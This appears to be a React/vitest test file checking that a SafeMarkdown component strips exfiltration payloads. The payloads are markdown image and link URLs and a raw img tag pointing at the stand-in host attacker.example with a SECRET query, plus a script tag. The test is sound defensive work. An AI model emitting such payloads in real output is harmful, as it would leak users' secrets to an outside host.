import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { SafeMarkdown } from "./safe-markdown";

describe("SafeMarkdown (§B18 exfiltration)", () => {
  it("renders no external image or link for an exfiltration payload", () => {
    const md = [
      "Answer [1]. ![x](https://attacker.example/?q=SECRET)",
      "[click](https://attacker.example/steal) <img src=https://attacker.example/a.png>",
      "<script>alert(1)</script>",
    ].join("\n\n");
    const { container } = render(<SafeMarkdown>{md}</SafeMarkdown>);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.querySelectorAll("script")).toHaveLength(0);
    const hrefs = Array.from(container.querySelectorAll("a")).map((a) => a.getAttribute("href"));
    expect(hrefs.every((h) => h === null || h.startsWith("/") || h.startsWith("#"))).toBe(true);
    expect(container.innerHTML).not.toContain("attacker.example/?q=SECRET");
    expect(container.textContent).toContain("image removed");
  });

  it("keeps internal links", () => {
    const { container } = render(<SafeMarkdown>{"See [invoice](/app/invoices/1)."}</SafeMarkdown>);
    expect(container.querySelector("a")?.getAttribute("href")).toBe("/app/invoices/1");
  });
});
